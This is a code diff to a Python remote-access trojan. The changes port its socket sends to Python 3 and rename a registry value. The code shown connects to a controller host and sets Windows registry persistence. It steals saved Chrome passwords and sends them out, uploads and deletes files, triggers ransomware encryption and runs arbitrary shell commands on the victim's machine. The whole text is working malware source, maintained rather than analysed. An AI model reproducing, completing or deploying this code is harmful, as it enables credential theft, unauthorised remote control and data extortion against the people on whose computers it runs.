@@ -62,9 +62,9 @@ class ShellcodeExploit(setClient):
                 self.payload.connect((self.IP_ADDRESS, self.PORT_ADDRESS))
                 if os.name == "nt":
 		    persistence()
-                    self.payload.send(os_system['windows'])
+                    self.payload.send(os_system['windows'].encode('utf-8'))
                 else:
-                    self.payload.send(os_system['linux'])
+                    self.payload.send(os_system['linux'].encode('utf-8'))
                 self.payload.settimeout(None)
                 self.connected = True
                 # print("Connected with exploit!!")
@@ -75,21 +75,21 @@ class ShellcodeExploit(setClient):
 
             while True:
                 try:
-                    self.data = self.payload.recv(4096)
+                    self.data = self.payload.recv(4096).decode()
                     if self.data[:2] == "cd":
                         try:
                             directory = self.data[3:]
                             os.chdir(directory)
-                            self.payload.send("=> Current directory: {}".format(os.getcwd()))
+                            self.payload.send("=> Current directory: {}".format(os.getcwd()).encode('utf-8'))
                         except os.error as _ERR:
-                            self.payload.send(str(_ERR))
+                            self.payload.send(str(_ERR).encode('utf-8'))
 
                     if self.data == "dump_chrome":
                         database = os.getenv('LOCALAPPDATA') + '\Google\Chrome\User Data\Default\Login Data'
                         ChromeDump(database)
                         with open("saved_pass.txt", "r") as file_password:
                             fn = file_password.read()
-                            self.payload.sendall(fn)
+                            self.payload.sendall(fn.encode('utf-8'))
                             file_password.close()
                         # os.remove("saved_pass.txt")
 
@@ -99,11 +99,11 @@ class ShellcodeExploit(setClient):
                             with open(filename, "rb") as downloadFiles:
                                 file_data = downloadFiles.read(1024)
                                 while file_data:
-                                    self.payload.send(file_data)
+                                    self.payload.send(file_data.encode('utf-8'))
                                     file_data = downloadFiles.read(1024)
-                                self.payload.send("[+] Completed downloaded.")
+                                self.payload.send("[+] Completed downloaded.".encode('utf-8'))
                         except IndexError:
-                            self.payload.send("Usage: download [filename]")
+                            self.payload.send("Usage: download [filename]".encode('utf-8'))
 
                     elif self.data.startswith("makezip") == True:
                         try:
@@ -116,24 +116,24 @@ class ShellcodeExploit(setClient):
                                         filename = os.path.join(base, file_target)
                                         self.created.write(filename, filename[rootlen:])
                                         self.created.close()
-                                self.payload.send("[+] Compressed folder successfully!!")
+                                self.payload.send("[+] Compressed folder successfully!!".encode('utf-8'))
                             elif os.path.isfile(filename_target) == True:
-                                self.payload.send("This a file failed to complete compress -> {}".format(filename_target))
+                                self.payload.send("This a file failed to complete compress -> {}".format(filename_target).encode('utf-8'))
                         except IndexError:
-                            self.payload.send("Usage: makezip [source folder]")
+                            self.payload.send("Usage: makezip [source folder]".encode('utf-8'))
 
                     elif self.data.startswith("del") == True:
                         try:
                             filename_to_delete = self.data.split()[1]
                             if os.path.isfile(filename_to_delete) == True:
                                 os.remove(filename_to_delete)
-                                self.payload.send("[+] Deleted file -> {}".format(filename_to_delete))
+                                self.payload.send("[+] Deleted file -> {}".format(filename_to_delete).encode('utf-8'))
                             elif os.path.isdir(filename_to_delete) == True:
-                                self.payload.send("[!] Failed to delete is folder -> {}".format(filename_to_delete))
+                                self.payload.send("[!] Failed to delete is folder -> {}".format(filename_to_delete).encode('utf-8'))
                             else:
-                                self.payload.send("[!] Invalid filename!!")
+                                self.payload.send("[!] Invalid filename!!".encode('utf-8'))
                         except IndexError:
-                            self.payload.send("Usage: del [filename]")
+                            self.payload.send("Usage: del [filename]".encode('utf-8'))
 
                     elif self.data.startswith("unzip") == True:
                         try:
@@ -141,11 +141,11 @@ class ShellcodeExploit(setClient):
                             if os.path.isfile(filename_zip) == True:
                                 with zipfile.ZipFile(filename_zip, "r") as file_zip:
                                     file_zip.extractall()
-                                    self.payload.send("[+] Completed unzip file -> {}".format(filename_zip))
+                                    self.payload.send("[+] Completed unzip file -> {}".format(filename_zip).encode('utf-8'))
                             else:
-                                self.payload.send("[!] Invalid filename!!")
+                                self.payload.send("[!] Invalid filename!!".encode('utf-8'))
                         except IndexError:
-                            self.payload.send("Usage: unzip [filename (.zip)]")
+                            self.payload.send("Usage: unzip [filename (.zip)]".encode('utf-8'))
 
                     elif self.data.startswith("encrypt") == True:
                         try:
@@ -154,7 +154,7 @@ class ShellcodeExploit(setClient):
                             encrypt = Ransomware(keyPasswords, fileEncrypt)
                             encrypt.encryptFiles()
                         except IndexError:
-                            self.payload.send("Usage: encrypt [file] [key]")
+                            self.payload.send("Usage: encrypt [file] [key]".encode('utf-8'))
 
                     elif self.data.startswith("decrypt") == True:
                         try:
@@ -163,27 +163,27 @@ class ShellcodeExploit(setClient):
                             decrypt = Ransomware(keyPasswords, fileDecrypt)
                             decrypt.decryptFiles()
                         except IndexError:
-                            self.payload.send("Usage: decrypt [file] [key]")
+                            self.payload.send("Usage: decrypt [file] [key]".encode('utf-8'))
 
                     elif self.data == "help":
-                        self.payload.sendall(command_help())
+                        self.payload.sendall(command_help().encode('utf-8'))
 
                     elif self.data == "info":
                         self.payload.send(get_info())
 
                     elif self.data == "quit":
-                        self.payload.send("Close connection!! Bye :D")
+                        self.payload.send("Close connection!! Bye :D".encode('utf-8'))
                         # self.payload.close()
                         self.run_payload()
                         # sys.exit()
 
                     elif self.data == None:
-                        self.payload.send("No send commands!!")
+                        self.payload.send("No send commands!!".encode('utf-8'))
 
                     else:  
                         process = subprocess.Popen(self.data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                         shell = process.stderr.read() + process.stdout.read()
-                        self.payload.send(str(shell))
+                        self.payload.send(str(shell).encode('utf-8'))
 
                 except KeyboardInterrupt:
                     self.payload.close()
@@ -229,7 +229,7 @@ def persistence():
 	bin_path = os.path.join(os.getcwd(), sys.argv[0])
 	try:
 		reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, run_key, 0, _winreg.KEY_WRITE)
-		_winreg.SetValueEx(reg_key, "LOVEYOU", 0, _winreg.REG_SZ, bin_path)
+		_winreg.SetValueEx(reg_key, "main", 0, _winreg.REG_SZ, bin_path)
 	except WindowsError:
 		print("Registry key failed!"); time.sleep(5)
 		sys.exit()
